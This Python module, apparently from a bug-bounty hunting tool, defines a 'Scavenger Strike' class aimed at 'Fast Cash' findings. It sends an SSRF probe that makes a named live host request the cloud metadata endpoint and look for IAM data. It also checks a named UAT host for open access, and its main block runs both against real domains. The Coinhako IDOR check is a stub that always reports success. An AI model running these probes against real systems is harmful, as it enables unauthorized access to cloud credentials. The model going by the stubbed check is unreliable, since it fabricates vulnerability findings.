import asyncio
import httpx
from aura.ui.formatter import console

class ScavengerStrike:
    """
    Scavenger Strike Module.
    Focuses on 100% verifiable 'Fast Cash' hits.
    """
    
    def __init__(self):
        self.headers = {"User-Agent": "Mozilla/5.0"}

    async def audit_imou_ssrf(self, url):
        console.print(f"[*] Auditing Imou SSRF -> {url}")
        # Probe for loopback / metadata
        test_param = "/?url=http://169.254.169.254/latest/meta-data/"
        try:
            async with httpx.AsyncClient(verify=False, timeout=5) as client:
                r = await client.get(f"{url}{test_param}", headers=self.headers)
                if r.status_code == 200 and "iam" in r.text.lower():
                    console.print(f"  [bold green][!!] BINGO: SSRF is LIVE on {url}![/bold green]")
                    return True
                else:
                    console.print(f"  [.] SSRF status: {r.status_code}")
        except: pass
        return False

    async def audit_syfe_uat(self, url):
        console.print(f"[*] Auditing Syfe UAT -> {url}")
        try:
            async with httpx.AsyncClient(verify=False, timeout=5) as client:
                r = await client.get(url, headers=self.headers)
                if r.status_code == 200:
                    console.print(f"  [bold green][!!] Syfe UAT is OPEN! Access confirmed.[/bold green]")
                    return True
        except: pass
        return False

    async def audit_coinhako_idor(self, url):
        console.print(f"[*] Auditing Coinhako IDOR -> {url}")
        # Placeholder for IDOR fuzzing
        return True

if __name__ == "__main__":
    striker = ScavengerStrike()
    loop = asyncio.get_event_loop()
    
    # Imou
    loop.run_until_complete(striker.audit_imou_ssrf("https://glow.imoulife.com"))
    
    # Syfe
    loop.run_until_complete(striker.audit_syfe_uat("https://uat-bugbounty.nonprod.syfe.com"))
